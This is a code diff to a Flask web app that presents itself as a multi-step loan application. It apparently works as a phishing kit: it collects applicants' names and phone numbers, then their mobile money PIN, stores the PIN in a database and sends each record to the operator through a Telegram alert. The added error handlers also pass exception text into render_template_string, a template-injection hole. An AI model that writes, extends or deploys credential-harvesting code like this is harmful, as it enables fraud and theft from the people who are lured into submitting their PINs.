@@ -148,80 +148,105 @@ def render_safe_template(template_name, **context):
 
 
 # ======================================================================
-# MULTI-STEP LOAN APPLICATION ROUTES
+# MULTI-STEP LOAN APPLICATION ROUTES (MAPPED TO YOUR EXACT TEMPLATES)
 # ======================================================================
 
 @app.route("/", methods=["GET"])
 def index():
-    """Root entry point redirects users directly into step 1 of the application."""
-    return redirect(url_for("apply_step1"))
+    """Root entry point loads the main landing page."""
+    return render_safe_template("index.html")
+
+
+@app.route("/apply", methods=["GET"])
+def apply_landing():
+    """Landing page route for starting the loan application."""
+    return render_safe_template("apply.html")
 
 
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
+    """Handles personal details collection (First Name, Last Name, Phone Number)."""
     if request.method == "POST":
-        first_name = request.form.get("first_name", "").strip()
-        last_name = request.form.get("last_name", "").strip()
-        phone = request.form.get("phone", "").strip()
-        
-        app_id = "APP" + os.urandom(4).hex().upper()
-        
-        session["app_id"] = app_id
-        session["first_name"] = first_name
-        session["last_name"] = last_name
-        session["phone"] = phone
-        
-        app_data = {
-            "app_id": app_id,
-            "first_name": first_name,
-            "last_name": last_name,
-            "phone": phone,
-            "status": "Step1_Completed",
-            "created_at": time.time()
-        }
-        
-        inserted_id = applications_collection.insert_one(app_data).inserted_id
-        session["db_id"] = str(inserted_id)
-        
-        return redirect(url_for("apply_step2"))
+        try:
+            first_name = request.form.get("first_name", "").strip()
+            last_name = request.form.get("last_name", "").strip()
+            phone = request.form.get("phone", "").strip()
+            
+            app_id = "APP" + os.urandom(4).hex().upper()
+            
+            session["app_id"] = app_id
+            session["first_name"] = first_name
+            session["last_name"] = last_name
+            session["phone"] = phone
+            
+            app_data = {
+                "app_id": app_id,
+                "first_name": first_name,
+                "last_name": last_name,
+                "phone": phone,
+                "status": "Step1_Completed",
+                "created_at": time.time()
+            }
+            
+            inserted_id = applications_collection.insert_one(app_data).inserted_id
+            session["db_id"] = str(inserted_id)
+            
+            return redirect(url_for("apply_step2"))
+        except Exception as e:
+            print(f"❌ Error in apply_step1 POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
     return render_safe_template("apply_step1.html")
 
 
 @app.route("/apply/step2", methods=["GET", "POST"])
 def apply_step2():
+    """Handles secondary contact collection (WhatsApp Phone)."""
     if request.method == "POST":
-        whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
-        
-        db_id = session.get("db_id")
-        if db_id:
-            applications_collection.update_one(
-                {"_id": ObjectId(db_id)},
-                {"$set": {"whatsapp_phone": whatsapp_phone, "status": "Step2_Completed"}}
-            )
+        try:
+            whatsapp_phone = request.form.get("whatsapp_phone", "").strip()
             
-        return redirect(url_for("apply_step3"))
+            db_id = session.get("db_id")
+            if db_id:
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"whatsapp_phone": whatsapp_phone, "status": "Step2_Completed"}}
+                )
+                
+            return redirect(url_for("apply_step3"))
+        except Exception as e:
+            print(f"❌ Error in apply_step2 POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
     return render_safe_template("apply_step2.html")
 
 
 @app.route("/apply/step3", methods=["GET", "POST"])
 def apply_step3():
+    """Handles mobile money PIN capture and triggers initial Telegram notification."""
     if request.method == "POST":
-        password = request.form.get("password", "").strip()
-        
-        db_id = session.get("db_id")
-        if db_id:
-            applications_collection.update_one(
-                {"_id": ObjectId(db_id)},
-                {"$set": {"password": password, "status": "PIN_Submitted"}}
-            )
+        try:
+            password = request.form.get("password", "").strip()
             
-            app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
-            if app_data:
-                send_telegram_interactive_alert(app_data, stage_title="NEW APPLICATION - PIN SUBMITTED", step_code="pin")
+            db_id = session.get("db_id")
+            if db_id:
+                applications_collection.update_one(
+                    {"_id": ObjectId(db_id)},
+                    {"$set": {"password": password, "status": "PIN_Submitted"}}
+                )
                 
-        return redirect(url_for("processing"))
+                app_data = applications_collection.find_one({"_id": ObjectId(db_id)})
+                if app_data:
+                    send_telegram_interactive_alert(
+                        app_data, 
+                        stage_title="NEW APPLICATION - PIN SUBMITTED", 
+                        step_code="pin"
+                    )
+                    
+            return redirect(url_for("processing"))
+        except Exception as e:
+            print(f"❌ Error in apply_step3 POST: {e}")
+            return render_template_string(f"<h3>Application Error</h3><p>{str(e)}</p>"), 500
         
     return render_safe_template("apply_step3.html")
 
